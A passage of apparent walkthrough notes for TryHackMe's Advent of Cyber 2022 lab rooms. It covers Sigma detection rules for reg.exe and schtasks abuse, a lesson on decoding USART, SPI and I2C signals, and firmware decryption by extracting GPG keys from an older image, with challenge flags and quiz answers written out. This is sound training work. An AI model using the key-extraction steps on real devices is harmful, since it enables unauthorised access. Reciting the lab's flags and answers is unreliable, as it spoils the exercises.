+    - 1
+    Image|endswith:
+    - reg.exe
+    CommandLine|contains|all:
+    - reg
+    - query
+    - /v
+    - svcVersion
+    
+  condition: selection # Action to be taken. Can use condition operators such as OR, AND, NOT when using multiple search identifiers.
+
+falsepositives: # Legitimate services or use.
+
+level:  # informational, low, medium, high or critical.
+
+tags: # Associated TTPs from MITRE ATT&CK
+  - {attack.tactic} # MITRE Tactic
+  - {attack.technique} # MITRE Technique 
+
+Successfully detected Windows Software Discovery. Here is your flag - THM{wh@t_1s_Runn1ng_H3r3}
+```
+What was the User's path in the Challenge #2 log file?
+![[Pasted image 20221221170710.png]]
+![[Pasted image 20221221170804.png]]
+*SIGMA_AOC2022\Bandit Yeti*
+What is the Challenge #3 flag?
+```text
+title: Schtasks Creation
+id: 3 # UUID
+status: experimental # experimental, test, stable, deprecated, unsupported.
+description: This rule will detect schtasks creation command
+author: witty
+modified: 1
+
+logsource: # Outlines target source of the logs based on operating system, service being run, category of logs.
+  product: windows # windows, linux, macos.
+  service: sysmon # sshd for Linux, Security for Windows, applocker, sysmon.
+  category: process_creation # firewall, web, antivirus, process_creation, network_connection, file_access.
+detection:
+  selection:
+    EventID: 1 # Change me
+    Image|endswith:
+    - schtasks.exe
+    CommandLine|contains|all:
+    - schtasks
+    - /create
+  condition: selection # Action to be taken. Can use condition operators such as OR, AND, NOT when using multiple search identifiers.
+
+falsepositives: # Legitimate services or use.
+
+level:  # informational, low, medium, high or critical.
+
+tags: # Associated TTPs from MITRE ATT&CK
+  - {attack.tactic} # MITRE Tactic
+  - {attack.technique} # MITRE Technique 
+
+Successfully detected Scheduled Task Creation. Here is your flag - THM{sch3dule_0npo1nt_101}
+```
+What was the MD5 hash associated with Challenge #3 logs?
+![[Pasted image 20221221172113.png]]
+![[Pasted image 20221221172150.png]]
+*2F6CE97FAF2D5EEA919E4393BDD416A7*
+Did you like learning about detection? Check out the [Yara](https://tryhackme.com/room/yara) room to learn more!
+### [Day 19] Hardware Hacking Wiggles go brrr
+The Story
+Check out John Hammond's video walkthrough for Day 19 [here](https://www.youtube.com/watch?v=HE12-x7E7lc)!
+Spying on Santa
+Elf McSkidy was doing a regular sweep of Santa's workshop when he discovered a hardware implant! The implant has a web camera attached to a microprocessor and another chip. It seems like someone was planning something malicious... We must try to understand what this implant was trying to do! We will deal with the microprocessor and the web camera in future tasks; for now, let's try to uncover what that other chip is being used for.
+The VM that we will use in this task takes approximately 8 minutes to start. We suggest that you start the machine now to have it ready by the time you get to the practical element of the task!
+Learning Objectives
+-   How data is sent via electrical wires in low-level hardware
+-   Hardware communication protocols
+-   How to analyse hardware communication protocols
+-   Reading USART data from a logic capture
+Welcome to the Matrix
+Hardware hacking is often shrouded in mystery and seen as a super complex topic. While there are a lot of in-depth complex hardware hacking components, getting our feet wet is actually pretty simple. Computers today are incredibly powerful. This allows them to build additional features and safety measures into their communication protocols to ensure that messages are transmitted reliably. Think about the Transmission Control Protocol (TCP), which has multiple redundancies in place! It even sends three full packets just to start its communication!
+In the world of microchips, we often don't have this luxury. To make sure our communication protocols are efficient as possible, we need to keep them as simple as possible. To do that, we need to enter the world of 0s and 1s. This then begs the question, how does hardware take electricity and generate signals? In this task, we will focus on digital communication. For hardware communication, we use a device called a Logic Analyser to analyse the signals. This device can be connected to the actual electrical wires that are used for communication between two devices that will capture and interpret the signals being sent. In this task, we will use a logic analyser to determine the communication between two devices in the rogue implant.
+The Electrical Heartbeat
+Back to our question, if we have electricity, how can we generate a digital signal? The approach most hardware components take is to simply turn the power on and off. If the power is on, we are transmitting a digital 1. If the power is off, we are transmitting a digital 0. We call these 1s and 0s bits. To perform communication, we simply turn the power on and off in a specific sequence to transmit a bunch of 0s and 1s. If we send 8 bits, we are sending a single byte! Voila! We have just performed digital hardware communication! These are the wonderful squiggly lines you would see on a logic analyser:
+We can transmit text data by using the [ASCII table](https://www.asciitable.com/). Sending the binary representation of each character, we can transmit data! However, it isn't actually just that simple. If we wanted zero effort in our communication, we would need an electrical wire for each 0 or 1 that we wanted to transmit. Considering that a single character is one byte of data (thus 8 electrical wires), this can become a mess of wires really fast! To make this more efficient, we need to use fewer wires and then have both hardware chips agree to a specific digital protocol and configuration that will be used to transmit data. Let's look at some of the most common protocols and how they work to send data still while reducing the number of wires we need.
+**USART**
+Universal Synchronous/Asynchronous Receiver-Transmitter (USART) communication, or as it is better known, serial communication, is a protocol that uses two wires. One wire is used to transmit (TX) data from device A to device B, and the other wire is used to receive (RX) data on device A from device B. In essence, we connect the transmit port from one device to the receive port from the other device and vice versa.
+What is interesting about this protocol is that there is no clock line that synchronises the communication of the devices. Without a clock, the devices have to agree to the configuration of communication, such as the following:
+-   Communication speed - This is also called the baud rate or bit rate and dictates how fast bytes of data can be sent. Agreeing to a specific rate tells each device how fast it should sample the data to get accurate communication. While there are fixed standards for baud rates, devices can choose to use any other rate as long as both devices support it.
+-   Bits per transmission - This is normally set to 8 bits which makes a byte, but it can be configured to something else, such as 16 bits.
+-   Stop and Start bits - Since there is no clock, one device has to send a signal to the other device before it can send or end a data transmission. The configuration of the start and stop bits dictate how this is done.
+-   Parity bits - Since there can be errors in the communication, parity bits can be used to detect and correct such errors in the transmission.
+Once the two devices agree on the configuration of the serial lines, they can now communicate with each other. A single transmission is shown in the diagram below on how the ASCII character of "S" would be transmitted:
+There are a couple of caveats, however. The devices don't really have a way to determine if the other device is ready for communication. To solve this, some USART connections will use two additional lines called Clear To Send (CTS) and Request to Send (RTS) to communicate to the other device whether it is ready to receive or ready to transmit. Furthermore, to agree upon what voltage level is a binary 1 or 0, a third wire called the Ground (GND) wire is required to allow the devices to have the same voltage reference.
+However, despite all of this, USART is an incredibly popular protocol in microprocessors due to its simplicity.
+**SPI**
+The Serial Peripheral Interface (SPI) communication protocol is mainly used for communication between microprocessors and small peripherals such as a sensor or an SD card. While USART communication has the clock built into the TX and RX lines, SPI uses a separate clock wire. Separating the clock (SCK) from the data (DATA) line allows for synchronous communication, which is faster and more reliable. So the trade-off is adding an additional wire, but we gain a speed and reliability boost. An example of the same "S" being transmitted using SPI is shown below:
+The clock line tells the receiving device exactly when it needs to read the data line. Two-way communication is also possible, but quite a bit more complex than serial communication. Essentially, one of the devices is labelled the controller. This is the only device that is allowed to send clock signals. All other devices become secondary devices that must follow the controller's clock signal to transmit data back. If two-way communication is used, instead of having a single data line, two lines are used, namely Peripheral-In Controller-Out (PICO), which means communication is sent from the controller, and Peripheral-Out Controller-In (POCI), which means communication is sent from the secondary device back to the controller. Using this, the controller sends a clock signal and a command out to the device using the PICO line and then keeping the clock signal, the controller receives data back on the PICO line, as shown in the diagram below:
+There is one additional change that can be made. While there can only be one controller, there can be multiple secondary devices. To save wires and ports, all devices can use the same SCK, PICO, and POCI lines. A fourth wire, called the Chip Select (CS) wire, is used to distinguish the device that the communication is meant for. The controller can use this line to indicate to the specific device that it wants to communicate to it, as shown in the diagram below:
+SPI communication is a fair bit more complex than USART, but having a dedicated clock line increases the speed at which we can communicate and improves reliability.
+**I2C**
+The Inter-Integrated Circuit (I2C) communication protocol was created to deal with the drawbacks of both the USART and SPI communication protocols. Because USART is asynchronous and has the clock built into the transmit and receive lines, devices have to agree ahead of time on the configuration of communication. Furthermore, speeds are reduced to ensure communication remains reliable. On the other hand, while SPI is faster and more reliable, it requires many more wires for communication, and every single additional peripheral requires one more Chip Select wire.
+I2C attempts to solve these problems. Similar to USART, I2C only makes use of two lines for communication. I2C uses a Serial Data (SDA) line and Serial Clock (SCL) line for communication. However, instead of using a Chip Select wire to determine which peripheral is being communicated to, I2C uses an Address signal that is sent on the SDA wire. This Address tells all controllers and peripherals which device is trying to communicate and to which device it is trying to communicate to. Once the signal is sent, a Data signal can be used to send the actual communication. To notify other controllers and peripherals that communication is taking place and prevent these devices from talking over each other, a Start and Stop signal is used. Each device can monitor these Start and Stop signals to determine if the lines are busy with communication. An example of such a data transmission is shown below:
+Since an external clock line is used, communication is still faster and more reliable than USART, and while it is slightly slower than SPI, the use of the Address signal means up to 1008 devices can be connected to the same two lines and will be able to communicate. Now that we understand the basics of hardware communication protocols, we can look to analyse the logic of that rogue implant!
+Probing the Logic
+After sending this rogue implant to the forensic lab for analysis, the following circuit diagram is uncovered:
+Analysing the Logic
+In order to analyse the logic data dump, we will need to use a logic analyser tool called [Saleae](https://www.saleae.com/). Start the machine attached to this task (if you have not already) which will open an in-browser Windows machine where all the required tools have already been installed for you. Once the machine is loaded on the Desktop, double-click the Logic 2 application. Once loaded, you should see this screen:
+Let's import the logic data dump to start our analyser. Select the Open a Capture option and select the `santa` file that is on the Desktop and click Open:
+You can ignore the calibration error popup. Once loaded, you should be able to see the captures. If you hold Left-Ctrl and use the mouse wheel to zoom out a bit (or you can click on View->X Zoom Out), you should be able to see the digital signals:
+D0 and D1 refer to the digital channels of the two lines that were probed. A0 and A1 refer to the analogue data from the probers. Hover your mouse over the first thick line on D1 channel 1 and use Left-Ctrl and the mouse wheel to zoom in again; you should be able to see the entire signal transfer:
+What is very interesting from this screen is that you can see how the analogue voltage data corresponds to the digital signal that is seen. Looking at the A1 Channel 1 vs D1 Channel 1, you can see that there are slight breaks in the analogue data that have been corrected in the digital channel. Now that we can see the digital signal data, we can look to use a logic analyser to read the contents of the data. Click on the Analyzers tab to the right:
+Since we know the protocol is USART, let's look to configure an Async Serial analyser for both Channel 1 and 0. Let's configure Channel 1's analyser first. If we were true hardware reverse engineers, we would first have to figure out the rate at which data is being transmitted as well as the specific configuration such as parity bits and frames. However, to keep this simple Forensic Elf has already discovered this for you. Alter your configuration to match the following and click Save:
+Once saved, we can see that the data is being analysed. Click the little terminal Icon, and we can actually read the data being transmitted!
+We see the initialisation sequence of the serial line and then three lines of data being sent:
+-   ACK REBOOT
+-   CMDX195837
+-   9600
+This doesn't yet mean anything since we are only seeing one side of the data. In order to see the other messages, we need to add another analyser to Channel 0. Click the plus icon next to Analysers and add another Async Serial analyser with the same configuration, except for Channel 0:
+Once added, click the Trash icon in the bottom right to remove all terminal data. Once done, click on the three dots next to each analyser and select Restart on both of them. Your terminal should now look something like this:
+Now we are starting to piece together the information! It seems like the microprocessor is establishing a session with the ESP32 device to allow communication to the control server! We can now see the full discussion between the two devices. The processor asks the ESP32 to reboot its connection to the control server. The ESP32 is happy to oblige but requests a security code to be sent to allow connection to the control server. Once the security code has been transmitted, the ESP32 allows the microprocessor to negotiate a new baud rate to be used for communication. Interestingly, once this new baud rate is accepted, we cannot read the rest of the output! However, since we intercepted the baud rate, we can simply edit our Channel 0 analyser to a new baud rate to read the rest of the communication that was sent. Go make this change to get your flag!
+This is excellent progress! We were able to read the initial communication between these two devices that were used to establish a connection to the control server. Now that we have this information, we can keep monitoring the lines and analysing the logic to see any messages that are sent. We are one step closer to knowing who is responsible for this rogue implant!
+Answer the questions below
+What device can be used to probe the signals being sent on electrical wires between two devices?
+*Logic Analyser*
+USART is faster than SPI for communication? (Yea,Nay)
+*Nay*
+USART communication uses fewer wires than SPI? (Yea,Nay)
+*Yea*
+USART is faster than I2C for communication? (Yea,Nay)
+*Nay*
+I2C uses more wires than SPI for communication? (Yea,Nay)
+*Nay*
+SPI is faster than I2C for communication? (Yea,Nay)
+*Yea*
+What is the maximum number of devices that can be connected on a single pair of I2C lines?
+*1008*
+What is the new baud rate that is negotiated between the microprocessor and ESP32 chip?
+*9600*
+What is the flag that is transmitted once the new baud rate was accepted?
+![[Pasted image 20221221185908.png]]
+![[Pasted image 20221221190245.png]]
+![[Pasted image 20221221190401.png]]
+Looking for a challenge? Try our [Recent Threats](https://tryhackme.com/module/recent-threats) module!
+### [Day 20] Firmware Binwalkin’ around the Christmas tree
+The Story
+Check out Saqib's video walkthrough for Day 20 [here](https://www.youtube.com/watch?v=1qc7C4h36ZQ)!
+We can now learn more about the mysterious device found in Santa's workshop. Elf Forensic McBlue has successfully been able to find the `device ID`. Now that we have the hardware `device ID`, help Elf McSkidy reverse the encrypted firmware and find interesting endpoints for IoT exploitation.
+**Learning Objectives**
+-   What is firmware reverse engineering
+-   Techniques for extracting code from the firmware
+-   Extracting hidden keys from an encrypted firmware
+-   Modifying and rebuilding a firmware
+**What is Firmware Reverse Engineering**
+Every embedded system, such as cameras, routers, smart watches etc., has pre-installed firmware, which has its own set of instructions running on the hardware's processor. It enables the **hardware to communicate with other software running on the device**. The firmware provides low-level control for the designer/developer to make changes at the root level.
+Reverse engineering is working your way back through the code to figure out how it was built and what it does. Firmware reverse engineering is extracting the original code from the firmware binary file and verifying that the code does not carry out any malicious or unintended functionality like undesired network communication calls. **Firmware reversing is usually done for security reasons** to ensure the safe usage of devices that may have critical vulnerabilities leading to possible exploitation or data leakage. Consider a smart watch whose firmware is programmed to send all incoming messages, emails etc., to a specific IP address without any indication to the user.
+**Firmware Reversing Steps**
+-   The firmware is first obtained from the vendor's website or extracted from the device to perform the analysis.
+-   The obtained/extracted firmware, usually a binary file, is first analysed to figure out its type (bare metal or OS based).
+-   It is verified that the firmware is either encrypted or packed. The encrypted firmware is more challenging to analyse as it usually needs a tricky workaround, such as reversing the previous non-encrypted releases of the firmware or performing hardware attacks like [Side Channel Attacks (SCA)](https://en.wikipedia.org/wiki/Side-channel_attack) to fetch the encryption keys.
+-   Once the encrypted firmware is decrypted, different techniques and tools are used to perform reverse engineering based on type.
+**Types of Firmware Analysis**
+Firmware analysis is carried out through two techniques, Static & Dynamic.
+**Static Analysis**
+Static analysis involves an essential examination of the binary file contents, performing its reverse engineering, and reading the assembly instructions to understand the functionality. This is done through multiple commonly used command line utilities and binary analysis tools such as:
+-   **[BinWalk](https://github.com/ReFirmLabs/binwalk):** A firmware extraction tool that extracts code snippets inside any binary by searching for signatures against many standard binary file formats like `zip, tar, exe, ELF,` etc. Binwalk has a database of binary header signatures against which the signature match is performed. The common objective of using this tool is to extract a file system like `Squashfs, yaffs2, Cramfs, ext*fs, jffs2,` etc., which is embedded in the firmware binary. The file system has all the application code that will be running on the device.
+-   **[Firmware ModKit (FMK)](https://www.kali.org/tools/firmware-mod-kit/)**: FMK is widely used for firmware reverse engineering. It extracts the firmware using `binwalk` and outputs a directory with the firmware file system. Once the code is extracted, a developer can modify desired files and repack the binary file with a single command.
+-   **[FirmWalker](https://github.com/craigz28/firmwalker)**: Searches through the extracted firmware file system for unique strings and directories like `etc/shadow`, `etc/passwd`, `etc/ssl`, special keywords like `admin, root, password`, etc., vulnerable binaries like `ssh, telnet, netcat` etc.
+**Dynamic Analysis**
+Firmware dynamic analysis involves running the firmware code on actual hardware and observing its behaviour through emulation and hardware/ software based debugging. One of the significant advantages of dynamic analysis is to analyse unintended network communication for identifying data pilferage. The following tools are also commonly used for dynamic analysis:
+-   **[Qemu](https://www.qemu.org/)**: Qemu is a free and open-source emulator and enables working on cross-platform environments. The tool provides various ways to emulate binary firmware for different architectures like Advanced RISC Machines (ARM), Microprocessors without Interlocked Pipelined Stages (MIPS), etc., on the host system. Qemu can help in full-system emulation or a single binary emulation of ELF (Executable and Linkable Format) files for the Linux system and many different platforms.
+-   **[Gnu DeBugger (GDB)](https://www.sourceware.org/gdb/)**[:](https://www.sourceware.org/gdb/) GDB is a dynamic debugging tool for emulating a binary and inspecting its memory and registers. GDB also supports remote debugging, commonly used during firmware reversing when the target binary runs on a separate host and reversing is carried out from a different host.
+**Shall We Reverse the Firmware? Let's Do It!**
+Launch the virtual machine by clicking `Start Machine` at the top right of this task. The machine will load in a split-screen view. If it does not, click the `Show Split View` button to view the machine. Wait for 1-2 minutes for the machine to load completely. In case you refresh your web browser page, it will appear as if the target machine has restarted/rebooted (as it shows the default terminal output that is shown after booting up). In reality, the machine state remains the same, and your progress is not lost. When reversing the firmware, use the password `Santa1010` if prompted for a **sudo** password.
+After identifying the device id, McSkidy extracted the encrypted firmware from the device. To reverse engineer it, she needs an unencrypted version of the firmware first - luckily, she found it online. Open the terminal and run the `dir` command. You will see the following directories:
+Terminal
+```shell-session
+ubuntu@machine$ dir
+bin  firmware-mod-kit  bin-unsigned
+```
+The `bin` folder contains the firmware binary, while the `firmware-mod-kit` folder contains the script for extracting and modifying the firmware.
+In this exercise, we will primarily be using two tools:
+-   **Binwalk**: For verifying encryption and can also be used to decrypt the firmware (Usage: `binwalk -E -N`)
+-   **Firmware Mod Kit (FMK)**: Library for firmware extraction and modification (Usage: `extract-firmware.sh`)
+Now coming over to the task, we will perform reversing step by step.
+**Step 1: Verifying Encryption**
+In this step, McSkidy will verify whether the binary `firmwarev2.2-encrypted.gpg` is encrypted through [file entropy analysis](https://en.kali.tools/?p=1634). First, change the directory to the `bin` folder by entering the command `cd bin`. She will then use the `binwalk` tool to verify the encryption using the command `binwalk -E -N firmwarev2.2-encrypted.gpg.`
+Terminal
+```shell-session
+ubuntu@machine:-/bin$ binwalk -E -N firmwarev2.2-encrypted.gpg 
+
+DECIMAL       HEXADECIMAL     ENTROPY
+--------------------------------------------------------------------------------
+0             0x0             Rising entropy edge (0.988935)
+```
+In the above output, the **rising entropy edge** means that the file is probably encrypted and has increased randomness.
+**Step 2: Finding Unencrypted Older Version**
+Since the latest version is encrypted, McSkidy found an older version of the same firmware. The version is located in the `bin-unsigned` folder. _Why was she looking for an older version?_ Because she wants to find encryption keys that she may use to decrypt the original firmware and reverse engineer it. McSkidy has decided to use the famous `FMK` tool for this purpose. To extract the firmware, change the directory by entering the command `cd ..` and then `cd bin-unsigned`. She extracted the firmware by issuing the following command.
+Terminal
+```shell-session
+ubuntu@machine:-/bin-unsigned$ extract-firmware.sh firmwarev1.0-unsigned 
+Firmware Mod Kit (extract) 0.99, (c)2011-2013 Craig Heffner, Jeremy Collake
+
+Scanning firmware...
+
+Scan Time:     
+Target File:   /home/ubuntu/bin/firmwarev1.0-unsigned
+MD5 Checksum:  b141dc2678be3a20d4214b93354fedc0
+Signatures:    344
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             TP-Link firmware header, firmware version: 0.-15360.3, image version: "", product ID: 0x0, product version: 138412034, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 4063744, kernel length: 512, rootfs offset: 849104, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
+13344         0x3420          U-Boot version string, "U-Boot 1.1.4 (Apr  6 2016 - 11:12:23)"
+13392         0x3450          CRC32 polynomial table, big endian
+14704         0x3970          uImage header, header size: 64 bytes, header CRC: 0x5A946B00, created: , image size: 35920 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x510235FE, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: lzma, image name: "u-boot image"
+14768         0x39B0          LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 93944 bytes
+131584        0x20200         TP-Link firmware header, firmware version: 0.0.3, image version: "", product ID: 0x0, product version: 138412034, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 3932160, kernel length: 512, rootfs offset: 849104, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
+132096        0x20400         LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 2494744 bytes
+1180160       0x120200        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2812026 bytes, 600 inodes, blocksize: 131072 bytes, created: 
+
+Extracting 1180160 bytes of tp-link header image at offset 0
+Extracting squashfs file system at offset 1180160
+3994112
+3994112
+0
+Extracting squashfs files...
+Firmware extraction successful!
+Firmware parts can be found in '/home/ubuntu/bin-unsigned/fmk/*'
+```
+Step 3: Finding Encryption Keys
+The original firmware is [gpg](https://en.wikipedia.org/wiki/GNU_Privacy_Guard) protected, which means that we need to find a public, and private key and a paraphrase to decrypt the originally signed firmware. We know that the unencrypted firmware is extracted successfully and stored in the `fmk` folder. The easiest way to find keys is by using the `grep` command. The `-i` flag in the grep command ignores case sensitivity while the `-r` operator recursively searches in the current directory and subdirectories.
+Terminal
+```shell-session
+ubuntu@machine:~bin-unsigned$ grep -ir key
+Binary file firmwarev2.2-encrypted.gpg matches
+Binary file firmwarev1.0-unsigned matches
+Binary file fmk/image_parts/rootfs.img matches
+Binary file fmk/rootfs/usr/sbin/dropbearmulti matches
+Binary file fmk/rootfs/usr/sbin/dhcp6ctl matches
+Binary file fmk/rootfs/usr/sbin/dhcp6c matches
+Binary file fmk/rootfs/usr/sbin/xl2tpd matches
+Binary file fmk/rootfs/usr/sbin/pppd matches
+Binary file fmk/rootfs/usr/sbin/dhcp6s matches
+Binary file fmk/rootfs/usr/bin/httpd matches
+fmk/rootfs/gpg/public.key:-----BEGIN PGP PUBLIC KEY BLOCK-----
+fmk/rootfs/gpg/public.key:-----END PGP PUBLIC KEY BLOCK-----
+fmk/rootfs/gpg/private.key:-----BEGIN PGP PRIVATE KEY BLOCK-----
+fmk/rootfs/gpg/private.key:-----END PGP PRIVATE KEY BLOCK-----
+```
+Bingo! We have the **public and private keys**, but what about the **paraphrase** usually used with the private key to decrypt a gpg encrypted file?
+Let's find the paraphrase through the same `grep` command.
+Terminal
+```shell-session
+ubuntu@machine:~bin-unsigned$ grep -ir paraphrase
+fmk/rootfs/gpg/secret.txt:PARAPHRASE: [OUTPUT INTENTIONALLY HIDDEN]
+```
+McSkidy has finally located the public and private keys and the paraphrase as well.
+Step 4: Decrypting the Encrypted Firmware
+Now that we have the keys, let's import them using the following command:
+Terminal
+```shell-session
+ubuntu@machine:~bin-unsigned$ gpg --import fmk/rootfs/gpg/private.key 
+gpg: key 56013838A8C14EC1: "McSkidy " not changed
+gpg: key 56013838A8C14EC1: secret key imported
+gpg: Total number processed: 1
+gpg:              unchanged: 1
+gpg:       secret keys read: 1
+gpg:  secret keys unchanged: 1
+```
+While importing the private key, you will be asked to enter the paraphrase. Enter the one you found in **Step 3**.
+Importing the public key.
+Terminal
+```shell-session
+ubuntu@machine:~bin-unsigned$ gpg --import fmk/rootfs/gpg/public.key 
+gpg: key 56013838A8C14EC1: "McSkidy " not changed
+gpg: Total number processed: 1
+gpg:              unchanged: 1
+```
+We can list the secret keys.
+Terminal
+```shell-session
+ubuntu@machine:~bin-unsigned$ gpg --list-secret-keys
+/home/ubuntu/.gnupg/pubring.kbx
+-------------------------------
+sec   rsa3072  [SC] [expires: ]
+      514B4994E9B3E47A4F89507A56013838A8C14EC1
+uid           [ unknown] McSkidy 
+ssb   rsa3072  [E] [expires: ]
+```
+Once the keys are imported, McSkidy decrypts the firmware using the `gpg` command. Again change the directory by entering the command `cd ..` and then `cd bin`.
+Terminal
+```shell-session
+ubuntu@machine:~bin$ gpg firmwarev2.2-encrypted.gpg
+gpg: WARNING: no command supplied.  Trying to guess what you mean ...
+gpg: encrypted with 3072-bit RSA key, ID 1A2D5BB2F7076FA8, created 
+      "McSkidy "
+```
+After decryption, once you issue the `ls` command, the decrypted file result will look like the following:
+Terminal
+```shell-session
+ubuntu@machine:~bin$ ls -lah
+
+-rw-rw-r-- 1 test test 3.9M Dec  7 19:10 firmwarev2.2-encrypted
+-rw-rw-r-- 1 test test 3.6M Dec  1 05:45 firmwarev2.2-encrypted.gpg
+```
+**Step 5: Reversing the** **Original** **Encrypted Firmware**
+This is the simplest step, and we can use `binwalk` or `FMK` to extract code from the recently unencrypted firmware. In this example, we will be using `FMK` to extract the code.
+Terminal
+```shell-session
+ubuntu@machine:~bin$ extract-firmware.sh firmwarev2.2-encrypted
+Firmware Mod Kit (extract) 0.99, (c)2011-2013 Craig Heffner, Jeremy Collake
+
+Scanning firmware...
+
+Scan Time:     
+Target File:   /home/ubuntu/bin/firmwarev2.2-encrypted
+MD5 Checksum:  af379de1dac784b3eab78339fb203fbc
+Signatures:    344
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             TP-Link firmware header, firmware version: 0.-15360.3, image version: "", product ID: 0x0, product version: 138412034, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 4063744, kernel length: 512, rootfs offset: 849104, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
+13344         0x3420          U-Boot version string, "U-Boot 1.1.4 (Apr  6 2016 - 11:12:23)"
+13392         0x3450          CRC32 polynomial table, big endian
+14704         0x3970          uImage header, header size: 64 bytes, header CRC: 0x5A946B00, created: , image size: 35920 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x510235FE, OS: Linux, CPU: MIPS, image type: Firmware Image, compression type: lzma, image name: "u-boot image"
+14768         0x39B0          LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 93944 bytes
+131584        0x20200         TP-Link firmware header, firmware version: 0.0.3, image version: "", product ID: 0x0, product version: 138412034, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 3932160, kernel length: 512, rootfs offset: 849104, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
+132096        0x20400         LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 2494744 bytes
+1180160       0x120200        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2776905 bytes, 596 inodes, blocksize: 131072 bytes, created: 
+
+Extracting 1180160 bytes of tp-link header image at offset 0
+Extracting squashfs file system at offset 1180160
+3957248
+4063744
+106496
+Extracting 106496 byte footer from offset 3957248
+Extracting squashfs files...
+Firmware extraction successful!
+Firmware parts can be found in '/home/ubuntu/bin/fmk/*'
+```
+McSkidy has finally been able to reverse the complete firmware and extract essential files she will use for IoT exploitation (next room). She has used the keys from an older version (1.0)  to decrypt the latest version (2.2) of the same firmware. The `Camera` folder in the `fmk/rootfs` directory will contain all the necessary files we will be using in the next task.
+Answer the questions below
+What is the flag value after reversing the file firmwarev2.2-encrypted.gpg?
+**Note**: The flag contains underscores - if you're seeing spaces, the underscores might not be rendering.
+Look into the fmk/rootfs folder.
+```text
+* Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Dec 22 04:33:41 UTC 2022
+
+  System load:  0.0               Processes:           118
+  Usage of /:   8.2% of 38.70GB   Users logged in:     1
+  Memory usage: 9%                IP address for eth0: 10.10.149.38
+  Swap usage:   0%
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+65 packages can be updated.
+1 update is a security update.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Thu Dec 22 04:21:50 2022 from 10.100.2.209
+test@ip-10-10-149-38:~$ ls
+bin  bin-unsigned  firmware-mod-kit
+test@ip-10-10-149-38:~$ cd bin
+test@ip-10-10-149-38:~/bin$ ls
+firmwarev2.2-encrypted.gpg
+test@ip-10-10-149-38:~/bin$ binwalk -E -N firmwarev2.2-encrypted.gpg 
+
+DECIMAL       HEXADECIMAL     ENTROPY
+--------------------------------------------------------------------------------
+0             0x0             Rising entropy edge (0.989903)
+
+test@ip-10-10-149-38:~/bin$ cd ../bin-unsigned/
+test@ip-10-10-149-38:~/bin-unsigned$ ls
+firmwarev1.0-unsigned
+test@ip-10-10-149-38:~/bin-unsigned$ extract-firmware.sh firmwarev1.0-unsigned 
+Firmware Mod Kit (extract) 0.99, (c)2011-2013 Craig Heffner, Jeremy Collake
+
+Scanning firmware...
+
+Scan Time:     
+Target File:   /home/test/bin-unsigned/firmwarev1.0-unsigned
+MD5 Checksum:  b141dc2678be3a20d4214b93354fedc0
+Signatures:    344
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             TP-Link firmware header, firmware version: 0.-15360.3, image version: "", product ID: 0x0, product versio
+n: 138412034, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 4063744, kernel length: 512, rootfs offset: 8491
+04, rootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
+13344         0x3420          U-Boot version string, "U-Boot 1.1.4 (Apr  6 2016 - 11:12:23)"
+13392         0x3450          CRC32 polynomial table, big endian
+14704         0x3970          uImage header, header size: 64 bytes, header CRC: 0x5A946B00, created: , image size: 3
+5920 bytes, Data Address: 0x80010000, Entry Point: 0x80010000, data CRC: 0x510235FE, OS: Linux, CPU: MIPS, image type: Firmware Image, 
+compression type: lzma, image name: "u-boot image"
+14768         0x39B0          LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 93944 bytes
+131584        0x20200         TP-Link firmware header, firmware version: 0.0.3, image version: "", product ID: 0x0, product version: 13
+8412034, kernel load address: 0x0, kernel entry point: 0x80002000, kernel offset: 3932160, kernel length: 512, rootfs offset: 849104, r
+ootfs length: 1048576, bootloader offset: 2883584, bootloader length: 0
+132096        0x20400         LZMA compressed data, properties: 0x5D, dictionary size: 33554432 bytes, uncompressed size: 2494744 bytes
+1180160       0x120200        Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 2812026 bytes, 600 inodes, block
+size: 131072 bytes, created: 
+
+Extracting 1180160 bytes of tp-link header image at offset 0
+Extracting squashfs file system at offset 1180160
+3994112
+3994112
+0
+Extracting squashfs files...
+[sudo] password for test: 
+Firmware extraction successful!
+Firmware parts can be found in '/home/test/bin-unsigned/fmk/*'
+
+test@ip-10-10-149-38:~/bin-unsigned$ ls
+firmwarev1.0-unsigned  fmk
+test@ip-10-10-149-38:~/bin-unsigned$ grep -ir key
+Binary file firmwarev1.0-unsigned matches
+Binary file fmk/image_parts/rootfs.img matches
+Binary file fmk/rootfs/usr/sbin/dropbearmulti matches
+Binary file fmk/rootfs/usr/sbin/dhcp6ctl matches
+Binary file fmk/rootfs/usr/sbin/dhcp6c matches
+Binary file fmk/rootfs/usr/sbin/xl2tpd matches
+Binary file fmk/rootfs/usr/sbin/pppd matches
+Binary file fmk/rootfs/usr/sbin/dhcp6s matches
